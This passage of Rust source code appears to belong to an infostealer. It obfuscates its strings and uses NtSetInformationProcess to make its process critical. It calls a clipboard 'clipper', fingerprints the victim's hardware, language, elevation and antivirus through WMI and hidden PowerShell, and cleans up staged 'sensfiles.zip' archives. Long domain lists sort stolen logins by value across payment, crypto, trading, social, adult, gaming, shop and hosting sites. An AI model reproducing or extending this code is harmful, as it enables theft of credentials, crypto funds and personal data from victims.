                let transmuted_rtladjustpriv: unsafe extern "system" fn(
                    usize,
                    bool,
                    bool,
                    *mut bool,
                ) -> i32 = std::mem::transmute(rtl_adjust_privilege);

                let transmuted_ntsetinfo: unsafe extern "system" fn(
                    HANDLE,
                    u32,
                    *mut u32,
                    u32,
                ) -> i32 = std::mem::transmute(nt_set_information_process);

                let mut old = false;

                transmuted_rtladjustpriv(19, true, true, &mut old);

                transmuted_ntsetinfo(GetCurrentProcess(), 0x1D, &mut 1, 4);
            }
            clipper::clipper();
        }
    }

    let temp_dir = env::temp_dir();
    let out_path = temp_dir.join(obfstr::obfstr!("out.zip"));
    let sensfiles_path = temp_dir.join(obfstr::obfstr!("sensfiles.zip"));

    let _ = fs::remove_file(sensfiles_path);
    let _ = fs::remove_file(out_path);
}

fn query_hardware(com: COMLibrary) -> Vec<String> {
    let wmi = WMIConnection::new(com).unwrap();

    let results: Vec<HashMap<String, Variant>> = wmi
        .raw_query(obfstr::obfstr!("SELECT Caption FROM Win32_OperatingSystem"))
        .unwrap();

    let mut os_name = String::from("Unknown");

    if let Some(os) = results.first() {
        if let Some(Variant::String(caption)) = os.get(obfstr::obfstr!("Caption")) {
            os_name = caption.to_string();
        }
    }

    let mut cpu_name = String::from("Unknown");

    let cpu_results: Vec<HashMap<String, Variant>> = wmi
        .raw_query(obfstr::obfstr!("SELECT Name FROM Win32_Processor"))
        .unwrap();

    if let Some(cpu) = cpu_results.first() {
        if let Some(Variant::String(name)) = cpu.get(obfstr::obfstr!("Name")) {
            cpu_name = name.to_string();
        }
    }

    let mut gpu_name = String::from("");

    let gpu_results: Vec<HashMap<String, Variant>> = wmi.raw_query(obfstr::obfstr!("SELECT Name,CurrentHorizontalResolution, CurrentVerticalResolution FROM Win32_VideoController")).unwrap();

    for gpu in gpu_results {
        if let Some(Variant::String(name)) = gpu.get(obfstr::obfstr!("Name")) {
            gpu_name.push_str(&format!("{}", name))
        }

        if let Some(Variant::UI4(res_x)) = gpu.get(obfstr::obfstr!("CurrentHorizontalResolution")) {
            if let Some(Variant::UI4(res_y)) = gpu.get(obfstr::obfstr!("CurrentVerticalResolution"))
            {
                gpu_name.push_str(&format!(" ({}, {})", res_x, res_y));
            }
        }
    }

    if gpu_name.is_empty() {
        gpu_name = String::from(obfstr::obfstr!("Unknown"));
    }

    // get hwid

    let mut hwid = String::from(obfstr::obfstr!("Unknown"));

    let hwid_results: Vec<HashMap<String, Variant>> = wmi
        .raw_query(obfstr::obfstr!("SELECT SerialNumber FROM Win32_BaseBoard"))
        .unwrap();

    if let Some(board) = hwid_results.first() {
        if let Some(Variant::String(serial)) = board.get(obfstr::obfstr!("SerialNumber")) {
            hwid = serial.to_string();
        }
    }

    // Current Language

    let mut language = String::from(obfstr::obfstr!("Unknown"));

    let mut binding = std::process::Command::new(obfstr::obfstr!("powershell.exe"));
    binding.creation_flags(0x08000000);

    binding
        .arg(obfstr::obfstr!("-NoProfile"))
        .arg(obfstr::obfstr!("-NonInteractive"))
        .arg(obfstr::obfstr!("-NoLogo"))
        .arg(obfstr::obfstr!("-Command"))
        .arg(obfstr::obfstr!("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Get-Culture | Select -ExpandProperty DisplayName"));

    let output = binding.output().unwrap();

    if output.status.success() {
        let out = String::from_utf8_lossy(&output.stdout);
        language = out.trim().to_string();
    }

    let mut out = Vec::new();

    out.push(format!("{}: {}", obfstr::obfstr!("OS"), os_name));
    out.push(format!("{}: {}", obfstr::obfstr!("CPU"), cpu_name));
    out.push(format!("{}: {}", obfstr::obfstr!("GPU"), gpu_name));
    out.push(format!("{}: {}", obfstr::obfstr!("HWID"), hwid));
    out.push(format!(
        "{}: {}",
        obfstr::obfstr!("Current Language"),
        language
    ));
    out.push(format!(
        "{}: {}",
        obfstr::obfstr!("FileLocation"),
        std::env::current_exe()
            .unwrap()
            .display()
            .to_string()
            .replace(r"\\?\", "") /* Replace UNIC Path */
    ));
    unsafe {
        out.push(format!(
            "{}: {}",
            obfstr::obfstr!("Is Elevated"),
            persistence::is_elevated()
        ));
    }

    out.push(obfstr::obfstr!("\r\n- Other Info -\r\n").to_string());

    // query antivirus

    let wmi = WMIConnection::with_namespace_path(obfstr::obfstr!("root\\SecurityCenter2"), com);

    if wmi.is_err() {
        out.push(format!("{}: {}", obfstr::obfstr!("Antivirus"), "Unknown"));
        return out;
    }

    let wmi = wmi.unwrap();

    let mut antivirus: HashSet<String> = HashSet::new();

    let antivirus_results: Vec<HashMap<String, Variant>> = wmi
        .raw_query(obfstr::obfstr!("SELECT displayName FROM AntiVirusProduct"))
        .unwrap();

    for antivirus_product in antivirus_results {
        if let Some(Variant::String(display_name)) =
            antivirus_product.get(obfstr::obfstr!("displayName"))
        {
            antivirus.insert(format!("\r\n    - {}", display_name));
        }
    }

    if antivirus.is_empty() {
        antivirus.insert(obfstr::obfstr!("Unknown").to_string());
    }

    out.push(format!("{}: {}", obfstr::obfstr!("Antivirus"), antivirus.iter().map(|f| f.to_string()).collect::<Vec<String>>().join("")));

    out
}

async fn start_server_and_wait() -> String {
    let data = tokio::spawn(async {
        use tokio::io::AsyncReadExt;
        let listener = tokio::net::TcpListener::bind("127.0.0.1:6949").await;

        let mut stream = match listener {
            Ok(listener) => listener.accept().await.unwrap().0,
            Err(_) => {
                return String::from("");
            }
        };

        // read the data from the client

        let mut data = [0u8; 500]; // using 50 byte buffer

        stream.read(&mut data).await.unwrap();

        let data = String::from_utf8_lossy(&data).to_string();

        for line in data.split("\r\n") {
            if line.starts_with(obfstr::obfstr!("User-Agent:")) {
                return line.replace(obfstr::obfstr!("User-Agent: "), "");
            }
        }
        "Not Found".to_string()
    })
    .await
    .unwrap();

    // start a tcp server on port 6949

    return data;
}

lazy_static! {
    pub static ref SENSITIVE: Vec<String> = vec![
        obfstr::obfstr!("panel").to_string(), 
        obfstr::obfstr!("access").to_string(),
        obfstr::obfstr!("admin").to_string(),
        obfstr::obfstr!("ftp").to_string(),
        obfstr::obfstr!("gui").to_string(),
        obfstr::obfstr!("users").to_string(),
        obfstr::obfstr!("media").to_string(),
        obfstr::obfstr!("tools").to_string(),
        obfstr::obfstr!("settings").to_string(),
        obfstr::obfstr!("db").to_string(),
        obfstr::obfstr!("database").to_string(),
        obfstr::obfstr!("worker").to_string(),
        obfstr::obfstr!("employer").to_string()
    ];
}

lazy_static! {
    pub static ref MONEY: Vec<String> = vec![
        obfstr::obfstr!("paypal.com").to_string(), 
        obfstr::obfstr!("skrill.com").to_string(), 
        obfstr::obfstr!("cash.app").to_string(), 
        obfstr::obfstr!("squareup.com").to_string(), 
        obfstr::obfstr!("revolut.com").to_string(),
        obfstr::obfstr!("stripe.com").to_string(),
        obfstr::obfstr!("venmo.com").to_string(),
        obfstr::obfstr!("neteller.com").to_string(),
        obfstr::obfstr!("transferwise.com").to_string(),
        obfstr::obfstr!("payoneer.com").to_string(),
        obfstr::obfstr!("bitpay.com").to_string(),
        obfstr::obfstr!("dwolla.com").to_string(),
        obfstr::obfstr!("2checkout.com").to_string(),
        obfstr::obfstr!("braintree.com").to_string(),
        obfstr::obfstr!("paysafe.com").to_string(),
        obfstr::obfstr!("authorize.net").to_string(),
    ];
}

lazy_static! {
    pub static ref STOCK: Vec<String> = vec![
        obfstr::obfstr!("etoro.com").to_string(),  
        obfstr::obfstr!("robinhood.com").to_string(),
        obfstr::obfstr!("ig.com").to_string(),
        obfstr::obfstr!("etoro.com").to_string(),
        obfstr::obfstr!("admiralmarkets.com").to_string(),
        obfstr::obfstr!("avatrade.com").to_string(),
        obfstr::obfstr!("plus500.com").to_string(),
        obfstr::obfstr!("forex.com").to_string(),
        obfstr::obfstr!("pepperstone.com").to_string(),
        obfstr::obfstr!("fxcm.com").to_string(),
        obfstr::obfstr!("cmtrading.com").to_string(),
        obfstr::obfstr!("saxomarkets.com").to_string(),
        obfstr::obfstr!("markets.com").to_string(),
        obfstr::obfstr!("cmcmarkets.com").to_string(),
        obfstr::obfstr!("dukascopy.com").to_string(),
        obfstr::obfstr!("icmarkets.com").to_string(),
        obfstr::obfstr!("fxpro.com").to_string(),
        obfstr::obfstr!("thinkmarkets.com").to_string(),
        obfstr::obfstr!("xtb.com").to_string(),
        obfstr::obfstr!("pepperstone.com").to_string(),
        obfstr::obfstr!("easymarkets.com").to_string(),
        obfstr::obfstr!("hotforex.com").to_string(),
        obfstr::obfstr!("jfdbank.com").to_string(),
        obfstr::obfstr!("exness.com").to_string(),
        obfstr::obfstr!("swissquote.com").to_string(),
        obfstr::obfstr!("octafx.com").to_string(),
        obfstr::obfstr!("activtrades.com").to_string(),
        obfstr::obfstr!("tradersway.com").to_string(),
        obfstr::obfstr!("vantagefx.com").to_string(),
        obfstr::obfstr!("alpari.com").to_string(),
        obfstr::obfstr!("fxtm.com").to_string(),
        obfstr::obfstr!("trading212.com").to_string()
    ];
}

lazy_static! {
    pub static ref CRYPTO: Vec<String> = vec![
        obfstr::obfstr!("coinbase.com").to_string(),
        obfstr::obfstr!("itrustcapital.com").to_string(),
        obfstr::obfstr!("margex.com").to_string(),
        obfstr::obfstr!("mexc.com").to_string(),
        obfstr::obfstr!("poloniex.com").to_string(),
        obfstr::obfstr!("primexbt.com").to_string(),
        obfstr::obfstr!("okx.com").to_string(),
        obfstr::obfstr!("bitrue.com").to_string(),
        obfstr::obfstr!("plisio.net").to_string(),
        obfstr::obfstr!("binance.com").to_string(),
        obfstr::obfstr!("kraken.com").to_string(),
        obfstr::obfstr!("gemini.com").to_string(),
        obfstr::obfstr!("bitstamp.net").to_string(),
        obfstr::obfstr!("bittrex.com").to_string(),
        obfstr::obfstr!("huobi.com").to_string(),
        obfstr::obfstr!("okex.com").to_string(),
        obfstr::obfstr!("uphold.com").to_string(),
        obfstr::obfstr!("cex.io").to_string(),
        obfstr::obfstr!("bitfinex.com").to_string(),
        obfstr::obfstr!("blockfi.com").to_string(),
        obfstr::obfstr!("crypto.com").to_string(),
        obfstr::obfstr!("eToro.com").to_string(),
        obfstr::obfstr!("coinmama.com").to_string(),
        obfstr::obfstr!("bitbuy.ca").to_string(),
        obfstr::obfstr!("coincheck.com").to_string(),
        obfstr::obfstr!("bitmart.com").to_string(),
        obfstr::obfstr!("gate.io").to_string(),
        obfstr::obfstr!("exmo.com").to_string(),
        obfstr::obfstr!("bitflyer.com").to_string(),
        obfstr::obfstr!("liquid.com").to_string(),
        obfstr::obfstr!("itbit.com").to_string(),
        obfstr::obfstr!("kucoin.com").to_string(),
        obfstr::obfstr!("paymium.com").to_string(),
        obfstr::obfstr!("cobinhood.com").to_string(),
        obfstr::obfstr!("lykke.com").to_string(),
        obfstr::obfstr!("gatehub.net").to_string(),
        obfstr::obfstr!("bitso.com").to_string(),
        obfstr::obfstr!("unocoin.com").to_string(),
        obfstr::obfstr!("bitbns.com").to_string(),
        obfstr::obfstr!("koinex.in").to_string(),
        obfstr::obfstr!("zebpay.com").to_string(),
        obfstr::obfstr!("coss.io").to_string(),
        obfstr::obfstr!("acx.io").to_string(),
        obfstr::obfstr!("omgfin.com").to_string(),
        obfstr::obfstr!("wazirx.com").to_string(),
        obfstr::obfstr!("luno.com").to_string(),
        obfstr::obfstr!("bit2c.co.il").to_string(),
        obfstr::obfstr!("coinsquare.com").to_string(),
        obfstr::obfstr!("independentreserve.com").to_string()
    ];
}

lazy_static! {
    pub static ref SOCIAL: Vec<String> = vec![
        obfstr::obfstr!("facebook.com").to_string(),
        obfstr::obfstr!("instagram.com").to_string(),
        obfstr::obfstr!("snapchat.com").to_string(),
        obfstr::obfstr!("discord.com").to_string(),
        obfstr::obfstr!("telegram.com").to_string(),
        obfstr::obfstr!("github.com").to_string(),
        obfstr::obfstr!("reddit.com").to_string(),
        obfstr::obfstr!("twitch.com").to_string(),
        obfstr::obfstr!("twitter.com").to_string(),
        obfstr::obfstr!("x.com").to_string(),
        obfstr::obfstr!("linkedin.com").to_string(),
        obfstr::obfstr!("tiktok.com").to_string(),
        obfstr::obfstr!("youtube.com").to_string(),
        obfstr::obfstr!("whatsapp.com").to_string(),
        obfstr::obfstr!("messenger.com").to_string(),
        obfstr::obfstr!("wechat.com").to_string(),
        obfstr::obfstr!("quora.com").to_string(),
        obfstr::obfstr!("dribbble.com").to_string(),
        obfstr::obfstr!("behance.net").to_string(),
        obfstr::obfstr!("soundcloud.com").to_string(),
        obfstr::obfstr!("medium.com").to_string()
    ];
}

lazy_static! {
    pub static ref PORN: Vec<String> = vec![
        obfstr::obfstr!("pornhubpremium.com").to_string(),
        obfstr::obfstr!("onlyfans.com").to_string(),
        obfstr::obfstr!("familystrokes.com").to_string(),
        obfstr::obfstr!("babes.com").to_string(),
        obfstr::obfstr!("vrporn.com").to_string(),
        obfstr::obfstr!("propertysex.com").to_string(),
        obfstr::obfstr!("pornpros.com").to_string(),
        obfstr::obfstr!("fakehub.com").to_string(),
        obfstr::obfstr!("pornworld.com").to_string(),
        obfstr::obfstr!("lubed.com").to_string(),
        obfstr::obfstr!("exxxtrasmall.com").to_string(),
        obfstr::obfstr!("adulttime.com").to_string(),
        obfstr::obfstr!("brazzers.com").to_string(),
        obfstr::obfstr!("bangbros.com").to_string(),
        obfstr::obfstr!("realitykings.com").to_string(),
        obfstr::obfstr!("purestaboo.com").to_string(),
        obfstr::obfstr!("girlsway.com").to_string(),
        obfstr::obfstr!("bang.com").to_string(),
        obfstr::obfstr!("letsdoeit.com").to_string(),
        obfstr::obfstr!("playboyp.com").to_string(),
        obfstr::obfstr!("wankz.com").to_string(),
        obfstr::obfstr!("babesnetwork.com").to_string(),
        obfstr::obfstr!("dorcelclub.com").to_string(),
        obfstr::obfstr!("topwebmodels.com").to_string(),
        obfstr::obfstr!("seehimfuck.com").to_string(),
        obfstr::obfstr!("digitalplayground.com").to_string(),
        obfstr::obfstr!("adultprime.com").to_string(),
        obfstr::obfstr!("extrememoviepass.com").to_string(),
        obfstr::obfstr!("newsensations.com").to_string(),
        obfstr::obfstr!("spizoo.com").to_string(),
        obfstr::obfstr!("pornprosnetwork.com").to_string(),
        obfstr::obfstr!("puba.com").to_string(),
        obfstr::obfstr!("karups.com").to_string(),
        obfstr::obfstr!("julesjordan.com").to_string(),
        obfstr::obfstr!("kink.com").to_string(),
        obfstr::obfstr!("private.com").to_string(),
        obfstr::obfstr!("famedigital.com").to_string(),
        obfstr::obfstr!("milehighmedia.com").to_string()        
    ];
}

lazy_static! {
    pub static ref GAMES: Vec<String> = vec![
        obfstr::obfstr!("steam.com").to_string(), 
        obfstr::obfstr!("epicgames.com").to_string(), 
        obfstr::obfstr!("g2a.com").to_string(), 
        obfstr::obfstr!("ubisoftconnect.com").to_string(), 
        obfstr::obfstr!("eneba.com").to_string(), 
        obfstr::obfstr!("gg.deals").to_string(), 
        obfstr::obfstr!("cdkeys.com").to_string(), 
        obfstr::obfstr!("allkeyshop.com").to_string(),
        obfstr::obfstr!("kinguin.net").to_string(),
        obfstr::obfstr!("steampowered.com").to_string(),
        obfstr::obfstr!("dlcompare.com").to_string()
    ];
}

lazy_static! {
    pub static ref SHOP: Vec<String> = vec![
        obfstr::obfstr!("sellix.io").to_string(), 
        obfstr::obfstr!("selly.io").to_string(), 
        obfstr::obfstr!("shopify.com").to_string(), 
        obfstr::obfstr!("sell.app").to_string(), 
        obfstr::obfstr!("sellfy.com").to_string(), 
        obfstr::obfstr!("autobuy.io").to_string(), 
        obfstr::obfstr!("shoppy.gg").to_string(),
        obfstr::obfstr!("storez.me").to_string()
    ];
}

lazy_static! {
    pub static ref HOSTING: Vec<String> = vec![
        obfstr::obfstr!("bluehost.com").to_string(),
        obfstr::obfstr!("hostgator.com").to_string(),
        obfstr::obfstr!("siteground.com").to_string(),
        obfstr::obfstr!("a2hosting.com").to_string(),
        obfstr::obfstr!("inmotionhosting.com").to_string(),
        obfstr::obfstr!("dreamhost.com").to_string(),
        obfstr::obfstr!("hostinger.com").to_string(),
        obfstr::obfstr!("godaddy.com").to_string(),
        obfstr::obfstr!("kinsta.com").to_string(),
        obfstr::obfstr!("wpengine.com").to_string(),
        obfstr::obfstr!("greengeeks.com").to_string(),
        obfstr::obfstr!("liquidweb.com").to_string(),
        obfstr::obfstr!("ipage.com").to_string(),
        obfstr::obfstr!("fatcow.com").to_string(),
        obfstr::obfstr!("namecheap.com").to_string(),
        obfstr::obfstr!("hostwinds.com").to_string(),
        obfstr::obfstr!("digitalocean.com").to_string(),
        obfstr::obfstr!("vultr.com").to_string(),
        obfstr::obfstr!("linode.com").to_string(),
        obfstr::obfstr!("hetzner.com").to_string(),
        obfstr::obfstr!("ovhcloud.com").to_string()
    ];
}

lazy_static! {
    pub static ref CDN: Vec<String> = vec![
        obfstr::obfstr!("cloudflare.com").to_string(),
        obfstr::obfstr!("akamai.com").to_string(),
        obfstr::obfstr!("maxcdn.com").to_string(),
        obfstr::obfstr!("cloudfront.net").to_string(),
        obfstr::obfstr!("keycdn.com").to_string(),
        obfstr::obfstr!("stackpath.com").to_string(),
        obfstr::obfstr!("fastly.com").to_string(),
        obfstr::obfstr!("incapsula.com").to_string(),
        obfstr::obfstr!("sucuri.net").to_string(),
        obfstr::obfstr!("belugacdn.com").to_string(),
        obfstr::obfstr!("chinacache.com").to_string(),
        obfstr::obfstr!("section.io").to_string(),
        obfstr::obfstr!("swiftstack.com").to_string(),
        obfstr::obfstr!("highwinds.com").to_string(),
        obfstr::obfstr!("cloudinary.com").to_string(),
        obfstr::obfstr!("leaseweb.com").to_string(),
        obfstr::obfstr!("verizon.com").to_string(),
        obfstr::obfstr!("rackspace.com").to_string(),
        obfstr::obfstr!("quantil.com").to_string(),
        obfstr::obfstr!("lumen.com").to_string(),
        obfstr::obfstr!("cachefly.com").to_string(),
        obfstr::obfstr!("gcorelabs.com").to_string(),
        obfstr::obfstr!("bitgravity.com").to_string(),
        obfstr::obfstr!("medianova.com").to_string(),
        obfstr::obfstr!("level3.com").to_string(),
        obfstr::obfstr!("cdnetworks.com").to_string(),
        obfstr::obfstr!("azion.com").to_string()
    ];
}
